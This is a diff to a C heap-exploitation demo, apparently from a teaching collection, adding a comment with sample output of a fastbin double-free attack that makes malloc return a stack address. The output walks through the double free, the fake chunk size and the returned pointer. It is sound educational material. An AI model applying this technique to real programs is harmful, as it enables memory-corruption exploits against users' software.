@@ -50,3 +50,30 @@ int main()
 	fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));
 	fprintf(stderr, "4th malloc(8): %p\n", malloc(8));
 }
+
+
+/*
+This file extends on fastbin_dup.c by tricking malloc into
+returning a pointer to a controlled location (in this case, the stack).
+The address we want malloc() to return is 0x7fff276161e8.
+Allocating 3 buffers.
+1st malloc(8): 0x55c9021fb260
+2nd malloc(8): 0x55c9021fb280
+3rd malloc(8): 0x55c9021fb2a0
+Freeing the first one...
+If we free 0x55c9021fb260 again, things will crash because 0x55c9021fb260 is at the top of the free list.
+So, instead, we'll free 0x55c9021fb280.
+Now, we can free 0x55c9021fb260 again, since it's not the head of the free list.
+Now the free list has [ 0x55c9021fb260, 0x55c9021fb280, 0x55c9021fb260 ]. We'll now carry out our attack by modifying data at 0x55c9021fb260.
+1st malloc(8): 0x55c9021fb260
+2nd malloc(8): 0x55c9021fb280
+Now the free list has [ 0x55c9021fb260 ].
+Now, we have access to 0x55c9021fb260 while it remains at the head of the free list.
+so now we are writing a fake free size (in this case, 0x20) to the stack,
+so that malloc will think there is a free chunk there and agree to
+return a pointer to it.
+Now, we overwrite the first 8 bytes of the data at 0x55c9021fb260 to point right before the 0x20.
+3rd malloc(8): 0x55c9021fb260, putting the stack address on the free list
+4th malloc(8): 0x7fff276161d8
+
+*/
